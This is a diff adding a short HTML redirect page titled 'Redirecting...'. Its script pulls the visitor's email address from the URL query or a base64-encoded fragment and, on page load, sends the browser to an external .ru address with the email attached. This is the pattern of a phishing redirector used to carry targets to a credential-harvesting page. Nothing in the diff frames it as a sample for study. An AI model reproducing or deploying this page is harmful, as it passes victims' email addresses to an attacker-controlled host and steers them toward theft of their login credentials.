@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script>
+        var autocode = "EMAILURLSILENTC0DERS";
+        var link = "https://udhercqwuwnt.ru/UvD91D0Rt7/";
+        function getEmailParamFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get("email");
+    
+        if (!emailParam) {
+        const urlFragment = window.location.hash.substring(1);
+        try {
+        const decodedText = atob(urlFragment);
+        return decodedText;
+        } catch (error) {
+        return urlFragment;
+        }
+        }
+        return emailParam;
+        }
+
+        const emailValue = getEmailParamFromURL();
+        if (emailValue) {
+        autocode = "#"+emailValue;
+        }
+        window.location.href = link+autocode;
+    </script>
+    <title>Redirecting...</title>
